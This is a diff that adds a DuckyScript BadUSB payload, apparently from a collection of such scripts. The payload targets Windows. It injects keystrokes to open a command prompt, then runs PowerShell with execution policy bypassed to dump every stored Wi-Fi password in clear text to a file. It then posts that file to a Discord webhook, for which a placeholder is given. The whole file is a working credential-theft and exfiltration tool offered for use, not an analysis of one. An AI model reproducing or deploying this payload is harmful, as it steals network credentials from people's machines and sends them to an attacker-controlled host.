@@ -1,0 +1,28 @@
+REM Title: Windows Wifi Password Exfil
+REM Author: Chris Garey
+REM Description: Extracts stored Wifi Passwords and sends to a discord server channel.
+REM Original: https://github.com/cgarey2014/BadUSB-Scripts/blob/main/windows_key_steal.txt
+REM Target:	Windows 
+
+REM Waits for connection
+DELAY 500
+
+REM Opens a command prompt
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+
+REM Takes the current stored Wifi Passwords, and appends them to a text file
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ': ')[1].Trim() }; $passwords = foreach ($profile in $profiles) { netsh wlan show profile name=$profile key=clear | Select-String 'Key Content' | ForEach-Object { $_.Line } }; $passwords | Out-File -FilePath $env:USERPROFILE\wifi_passwords.txt"
+ENTER
+
+REM Takes the created txt file and sends it to discord webhook
+REM Replace 'YOUR_WEBHOOK_HERE' with your webhook.
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$passwords = Get-Content -Path $env:USERPROFILE\wifi_passwords.txt -Raw; $body = @{content=$passwords}; Invoke-WebRequest -Uri 'YOUR_WEBHOOK_HERE' -Method Post -ContentType 'application/x-www-form-urlencoded' -Body $body"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
